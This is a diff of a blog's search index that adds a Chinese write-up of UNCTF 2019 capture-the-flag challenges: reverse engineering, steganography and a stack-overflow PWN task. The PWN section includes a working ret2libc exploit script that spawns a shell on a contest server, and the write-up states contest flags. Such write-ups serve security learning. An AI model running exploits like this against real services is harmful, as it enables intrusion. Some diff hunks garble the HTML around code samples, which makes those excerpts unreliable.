@@ -3,6 +3,249 @@
   
     
     <entry>
+      <title><![CDATA[UNCTF-WP]]></title>
+      <url>/2019/10/26/unctf-wp/</url>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H177f67923b764acd81d41f273e48f59bR.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>有壳 且没有检测出具体壳的种类 使用ESP定律手动脱壳 </p>
+<p><img src="https://ae01.alicdn.com/kf/H385b1b23dcc94510bdadae87f250ec19m.png" alt></p>
+<p>已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有flag</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H951b18e9b2884ed586e617c995e78402r.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>得到flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p>
+<h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>拖入IDA 看算法 在encode函数内发现主要算法 </p>
+<p><img src="https://ae01.alicdn.com/kf/H2be8210dda1a4d9cbbb77b0c674efdcam.png" alt></p>
+<p>同时在主函数结尾发现strcmp函数 推测是比较加密后的flag</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/He8a1df62631d402290b70f623bf887f0p.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>写出逆算法即可</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
+using namespace std<span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span><span class="token comment" spellcheck="true">//iN."K.v"w""zorhwzi</span>
+    <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> a2<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0x12</span><span class="token punctuation">;</span>
+    cin<span class="token operator">>></span>a2<span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator"><</span>key<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">;</span>
+        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">;</span>
+        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token operator">^</span><span class="token number">6</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    cout<span class="token operator"><<</span>a1<span class="token punctuation">;</span>
+ <span class="token punctuation">}</span> </code></pre>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hfc2b5deb6260419db18bf6bee9ab746cJ.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>得到flag:unctf{b66_6b6_66b}</p>
+<h3 id="unctf-easy-Maze"><a href="#unctf-easy-Maze" class="headerlink" title="unctf_easy_Maze"></a>unctf_easy_Maze</h3><p>从名字中就可以推测出是迷宫题 下载附件 拖进IDA</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H527c4d5522d14ffb99fff951ccf981b1j.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>v9数组明显是最初始在定义数组 原本是一个个的变量 通过手动修正可以让IDA识别成为数组 步入Step0和Step1两个函数 发现是分别对原本的迷宫进行变换 而Step2函数则是接受输入 进入走迷宫的环节 在尝试下写逆算法后选择放弃 决定使用动态调试 在Step2函数前下断 找到变换完成后的迷宫即可 </p>
+<blockquote>
+</blockquote>
+<p>第一次变换后迷宫</p>
+<p>ff ff ff ff 00 00 00 00 ff ff ff ff 00 00 00 00</p>
+<p>01 00 00 00 02 00 00 00 00 00 00 00 01 00 00 00</p>
+<p>ff ff ff ff 00 00 00 00 ff ff ff ff 00 00 00 00</p>
+<p>ff ff ff ff 01 00 00 00 ff ff ff ff 01 00 00 00</p>
+<p>01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
+<p>ff ff ff ff 01 00 00 00 00 00 00 00 00 00 00 00</p>
+<p>00 00 00 00 00 00 00 00 ff ff ff ff 00 00 00 00</p>
+<p>ff ff ff ff 00 00 00 00 00 00 00 00 01 00 00 00</p>
+<p>00 00 00 00 01 00 00 00 00 00 00 00 01 00 00 00</p>
+<p>00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
+<p>ff ff ff ff ff ff ff ff 01 00 00 00 00 00 00 00</p>
+<p>00 00 00 00 ff ff ff ff ff ff ff ff ff ff ff ff</p>
+<p>01 00 00 00                                   </p>
+<p>第二次变换后的迷宫</p>
+<p>01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
+<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
+<p>00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00</p>
+<p>00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
+<p>01 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00</p>
+<p>01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p>
+<p>01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
+<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
+<p>00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
+<p>00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
+<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
+<p>01 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00</p>
+<p>01 00 00 00   </p>
+<blockquote>
+</blockquote>
+<p>在step2函数中得知迷宫为7*7迷宫 写出脚本输出迷宫</p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><iostream></span></span>
+using namespace std<span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">char</span> mazz<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"1001111101100111101110001100111100010001111111101"</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator"><</span><span class="token number">49</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">7</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            cout<span class="token operator"><<</span>endl<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        cout<span class="token operator"><<</span>mazz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>    
+<span class="token punctuation">}</span></code></pre>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H16a308588307444e99589e8d835d5845l.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>对照迷宫从(0,0)走到(6,6)即可 </p>
+<p><img src="https://ae01.alicdn.com/kf/Ha6b282e91d8346fb9ffb4d6744471271Z.png" alt></p>
+<p>得到flag:UNCTF{ssddwdwdddssaasasaaassddddwdds}</p>
+<h3 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h3><p>这题应该我是非预期解… 没有进行算法逆向和动态调试 直接使用Python中的Angr库进行符号执行 得到flag</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H5dddc8800dcb4418b5c19e68e57f0217H.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>贴出脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> angr
+
+project<span class="token operator">=</span>angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./vm"</span><span class="token punctuation">,</span>auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+state<span class="token operator">=</span>project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>
+simgr<span class="token operator">=</span>project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
+simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x400BDA</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token number">0x400B96</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<h3 id="奇怪的数组"><a href="#奇怪的数组" class="headerlink" title="奇怪的数组"></a>奇怪的数组</h3><p>载入IDA 通过阅读主函数 知道flag的格式为flag{****}</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H0010bde43e734b52988cc085af9b232eI.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>步入char2hex函数查看算法 发现首先是限制输入只能为 <strong>‘0’<del>‘9’&&’a’</del>‘e’</strong> 发现后面的减法运算其实就是将字符转为数值 0~15 返回到主函数 发现在关键if判断前有一个 <strong>v9=16*v11+v10</strong> 确定是十六进制运算 <em>简单举例就是A*16+D=AD</em><br>然后将得数和程序预先设计好的checkbox数组进行比较 可以得知 程序需要的输入其实就是checkbox数组的值 </p>
+<p><img src="https://ae01.alicdn.com/kf/H579884a3afc84b6b9ca56c6e424a3cd2E.png" alt></p>
+<p>得到flag:flag{ad461e203c7975b35e527960cbfeb06c}</p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h3><p>玩就完事了= =</p>
+<h3 id="信号不好我先挂了"><a href="#信号不好我先挂了" class="headerlink" title="信号不好我先挂了"></a>信号不好我先挂了</h3><p>下载附件 载入Stegsolve发现存在图片隐写 且隐写数据为504B0304开头 怀疑是压缩包 直接保存成ZIP </p>
+<p><img src="https://ae01.alicdn.com/kf/H98899544adbe44dfa49cc7f2f25d6efcR.png" alt></p>
+<p>得到一个长得和原图一模一样的图片 使用十六进制编辑器和Stegsolve都没有发现线索 在百度过后怀疑是隐水印 使用工具BlindWaterMark尝试破解 得到flag</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hbdacf6fb10b94692b0042ab46eae90b6j.png" alt title class>
+                <p></p>
+            </figure>
+
+<h3 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h3><p>下载附件 发现是个Python脚本 运行后输出一句</p>
+<blockquote>
+</blockquote>
+<p>It’s a simple question. Take it easy. Don’t think too much about it.</p>
+<blockquote>
+</blockquote>
+<p>猜测可能直接就是2019unctf 粗略阅读下代码 发现后面有base64decode 怀疑是经过base64加密后的”2019unctf” 加密后尝试 得到flag</p>
+<p>flag:flag{34a94868a8ad9ff82baadb326c513d40}</p>
+<h3 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h3><p>这真的不是社工题么… 下载后发现是mp3 音频分析后没有线索 尝试使用16进制编辑器查看 发现文件最后存有一个压缩包 </p>
+<p><img src="https://ae01.alicdn.com/kf/H3957789159424e6892be90a5e079cf93O.png" alt></p>
+<p>直接修改后缀 发现压缩包需要密码  尝试爆破无果 发现压缩包备注 “qmusic 2019.7.27 17:47” 在QQ音乐上的同歌曲下的评论区寻找对应评论 得到密码 “真的上头” 解压出来一张图片 拖入十六进制编辑器 发现存在压缩包</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H99778f2de6394b0b975fdca9696afc871.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>直接修改后缀 在压缩包 /Word/media/ 路径下发现flag图片</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hb41cabac09d74679a4b9f43f79d07c8fP.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>得到falg:UNCTF{W3_L0v3_Unctf}</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>标准的栈溢出ROP 直接贴出脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+<span class="token comment" spellcheck="true">#sh = process("./easyrop")</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so"</span><span class="token punctuation">)</span>
+sh<span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.71.29.5"</span><span class="token punctuation">,</span><span class="token string">"10041"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./easyrop"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello CTFer!"</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"d"</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x66666666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
+ret_addr <span class="token operator">=</span> <span class="token number">0x80485FC</span>
+puts_plt <span class="token operator">=</span><span class="token number">0x80483E0</span><span class="token comment" spellcheck="true"># elf.plt['puts']</span>
+main_addr <span class="token operator">=</span> <span class="token number">0x8048592</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+payload <span class="token operator">=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+shell_addr<span class="token operator">=</span> <span class="token number">0x0015902b</span><span class="token operator">+</span> libc_base
+
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello CTFer!"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"d"</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x66666666</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>这里因为我使用的是 乌班图18.04 libc版本不同 当时本地能打通 而远程打不通 后来发现是libc问题 使用LibcSearcher拷贝了一份libc过来 所以在代码中直接引入了Libc文件</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H5d708fa87e3546bba2728aea97fb5dc1Z.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>得到flag:UNCTF{7ef293810e29039f061982e72fd10bfb}</p>
+<p>### </p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script></body></html>]]></content>
+      
+        
+        <tags>
+            
+            <tag> WP </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[栈溢出漏洞及利用]]></title>
       <url>/2019/10/11/zhan-yi-chu/</url>
       <content type="html"><![CDATA[<html><head></head><body><h2 id="简述漏洞形成"><a href="#简述漏洞形成" class="headerlink" title="简述漏洞形成"></a>简述漏洞形成</h2><blockquote>
@@ -53,7 +296,7 @@ int main(void)
 {
       hello();
       return 0;
-}</code></pre>
+}</stdlib.h></stdio.h></code></pre>
 <p>在乌班图上使用GCC编译 首先我们关闭所有的保护 这里我是将程序编译成32位 64位同理</p>
 <blockquote>
 <p>NX：-z execstack / -z noexecstack (关闭/开启) 栈执行</p>
@@ -105,8 +348,8 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>第二种方法就是利用溢出 直接将字符串覆盖到Canary值 然后在输出的时候直接输出出来 这种方法的局限性是要求读入字符串的函数 不会将00加入到字符串尾 不然会直接截断字符串 导致不能将Canary值带出来 </p>
 <p>下面分别给出两种情况的案例 来绕过Canary保护</p>
 <h3 id="配合格式化字符串绕过"><a href="#配合格式化字符串绕过" class="headerlink" title="配合格式化字符串绕过"></a>配合格式化字符串绕过</h3><p>首先给出案例代码</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
 
 <span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -123,7 +366,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></code></pre>
@@ -163,8 +406,8 @@ sh<span class="token punctuation">.</span>recvuntil<span class="token punctuatio
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <h3 id="溢出覆盖绕过Canary保护"><a href="#溢出覆盖绕过Canary保护" class="headerlink" title="溢出覆盖绕过Canary保护"></a>溢出覆盖绕过Canary保护</h3><p>先给出样例</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string"><stdlib.h></span></span>
 
 <span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -181,7 +424,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></code></pre>
@@ -1083,9 +1326,7 @@ int main(void)
 {
     int i=0;
     EnBase64();
-    cout<<ans;
-
-} </code></pre>
+    cout<<ans; } < code></ans;></iostream></code></pre><code class="language-C">
 <h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫 · 惠勒与罗杰 · 尼达姆</p>
 <p>Tea的实现代码比较固定 这里给出常见Tea加密的实现代码</p>
 <pre class=" language-C"><code class="language-C">#include <stdint.h>
@@ -1112,7 +1353,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
         sum -= delta;                                   
     }                                              /* end cycle */
     v[0]=v0; v[1]=v1;
-}</code></pre>
+}</stdint.h></code></pre>
 <p>Tea加密的明显特征是 ==存在一个Image Number:0x9e3779b9== </p>
 <h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>MD5 消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value），用于确保信息传输完整一致。MD5 由美国密码学家罗纳德 · 李维斯特（Ronald Linn Rivest）设计，于 1992 年公开，用以取代 MD4 算法。这套算法的程序在 RFC 1321 中被加以规范</p>
 <p>这里给出MD5实现的伪代码</p>
@@ -1196,7 +1437,7 @@ void decrypt (uint32_t* v, uint32_t* k) {
             });
             document.body.appendChild(img);
           });
-      </script></body></html>]]></content>
+      </script></code></body></html>]]></content>
       
         
         <tags>
